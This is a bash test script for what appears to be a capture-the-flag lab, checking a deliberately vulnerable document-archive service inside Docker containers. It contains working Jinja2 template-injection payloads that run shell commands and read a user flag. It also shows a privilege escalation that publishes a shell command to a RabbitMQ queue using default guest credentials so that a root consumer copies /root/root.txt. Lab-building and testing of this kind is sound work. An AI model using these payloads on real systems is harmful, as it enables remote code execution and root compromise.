#!/usr/bin/env bash
#
# DIRECTIVE ZERO — AM-05 exploit-chain test assertions.
#
# Two-container topology: archive (public) + archive-consumer (internal).
# Stages 1-3 test the public host via published ports.
# Stages 4-5 use docker exec to test the MQ privesc path.
#
# Env vars set by the runner:
#   AM_USER_FLAG, AM_ROOT_FLAG, TARGET_HOST

run_am_tests() {
  local http_port="${TARGET_HTTP_PORT:-8443}"
  local ssh_port="${TARGET_SSH_PORT:-22}"
  local amqp_port="${TARGET_AMQP_PORT:-5672}"
  local archive_container="${AM05_CONTAINER:-dz-am05-archive}"
  local consumer_container="${AM05_CONSUMER_CONTAINER:-dz-am05-consumer}"

  echo "Stage 1 — service enumeration"
  assert_port_open "$ssh_port"
  assert_port_open "$http_port"
  assert_port_open "$amqp_port"

  echo "Stage 2 — document service on HTTPS :$http_port"
  # The document service uses a self-signed cert — use curl -k.
  local doc_page
  doc_page="$(curl -sk "https://${TARGET_HOST}:${http_port}/" 2>/dev/null || true)"
  if echo "$doc_page" | grep -q "THE ARCHIVE"; then
    pass "document service serves the Archive portal page"
  else
    fail "document service does not serve the portal page"
  fi
  if echo "$doc_page" | grep -q "Document Submission"; then
    pass "upload form is present"
  else
    fail "upload form not found"
  fi

  echo "Stage 3 — SSTI foothold (Jinja2 render_template_string)"
  # Test basic SSTI: {{ 7*7 }} should render as 49.
  local ssti_out
  ssti_out="$(curl -sk -X POST -d 'content={{ 7*7 }}' \
    "https://${TARGET_HOST}:${http_port}/upload" 2>/dev/null || true)"
  if echo "$ssti_out" | grep -q '49'; then
    pass "SSTI confirmed: {{ 7*7 }} -> 49"
  else
    fail "SSTI not working: {{ 7*7 }} did not produce 49"
  fi

  # Test RCE via SSTI.
  ssti_out="$(curl -sk -X POST \
    --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}' \
    "https://${TARGET_HOST}:${http_port}/upload" 2>/dev/null || true)"
  if echo "$ssti_out" | grep -q 'uid='; then
    pass "SSTI RCE confirmed: id output contains uid="
  else
    fail "SSTI RCE not working"
  fi

  echo "Stage 4 — user flag via SSTI"
  local user_actual
  user_actual="$(curl -sk -X POST \
    --data-urlencode 'content={{ config.__class__.__init__.__globals__["os"].popen("cat /home/archivist/user.txt").read() }}' \
    "https://${TARGET_HOST}:${http_port}/upload" 2>/dev/null | grep -oE 'DZ\{[^}]+\}' | head -1)"
  assert_flag_matches "$user_actual" "$AM_USER_FLAG"

  echo "Stage 5 — RabbitMQ discovery + MQ privesc"
  # Verify RabbitMQ is accessible on the archive container.
  local rabbit_status
  rabbit_status="$(docker exec "$archive_container" rabbitmqctl status 2>/dev/null | grep -c 'rabbit' || true)"
  if [[ "$rabbit_status" -gt 0 ]]; then
    pass "RabbitMQ is running on archive"
  else
    fail "RabbitMQ not running on archive"
  fi

  # Verify the consumer is connected by checking the queue has a consumer.
  local queue_info
  queue_info="$(docker exec "$archive_container" rabbitmqctl list_queues name consumers 2>/dev/null | grep archive_commands || true)"
  if echo "$queue_info" | grep -qE '[0-9]+'; then
    pass "archive-consumer is connected to archive_commands queue"
  else
    fail "archive-consumer not connected to the queue"
  fi

  # Publish a command to the archive_commands queue via docker exec on
  # the archive container (install pika if needed, or use rabbitmqadmin).
  # Use a Python one-liner since pika may not be on the archive container.
  docker exec "$archive_container" python3 -c "
import pika, sys
try:
    conn = pika.BlockingConnection(pika.ConnectionParameters('localhost', 5672,
        credentials=pika.PlainCredentials('guest','guest')))
    ch = conn.channel()
    ch.queue_declare(queue='archive_commands')
    ch.basic_publish(exchange='', routing_key='archive_commands',
        body='cat /root/root.txt > /shared_archive/root_flag.txt; chmod 444 /shared_archive/root_flag.txt')
    conn.close()
    print('MESSAGE_PUBLISHED')
except Exception as e:
    print(f'ERROR: {e}')
    sys.exit(1)
" 2>/dev/null || docker exec "$archive_container" bash -c '
pip3 install --break-system-packages pika -q 2>/dev/null
python3 -c "
import pika
conn = pika.BlockingConnection(pika.ConnectionParameters(\"localhost\", 5672, credentials=pika.PlainCredentials(\"guest\",\"guest\")))
ch = conn.channel()
ch.queue_declare(queue=\"archive_commands\")
ch.basic_publish(exchange=\"\", routing_key=\"archive_commands\", body=\"cat /root/root.txt > /shared_archive/root_flag.txt; chmod 444 /shared_archive/root_flag.txt\")
conn.close()
print(\"MESSAGE_PUBLISHED\")
"
' 2>/dev/null

  # Wait for the consumer to process the message.
  local root_actual=""
  for i in $(seq 1 12); do
    root_actual="$(docker exec "$archive_container" cat /shared_archive/root_flag.txt 2>/dev/null | tr -d '\n')"
    if [[ -n "$root_actual" ]]; then break; fi
    sleep 5
  done
  assert_flag_matches "$root_actual" "$AM_ROOT_FLAG"

  echo "Stage 6 — lore Fragment E (founding charter)"
  local charter
  charter="$(curl -sk "https://${TARGET_HOST}:${http_port}/documents/founding_charter.txt" 2>/dev/null || true)"
  if echo "$charter" | grep -q 'FRAGMENT E'; then
    pass "founding charter contains Fragment E"
  else
    fail "founding charter does not contain Fragment E"
  fi
  if echo "$charter" | grep -q 'surface was habitable'; then
    pass "founding charter confirms surface was habitable"
  else
    fail "founding charter does not mention surface habitability"
  fi
}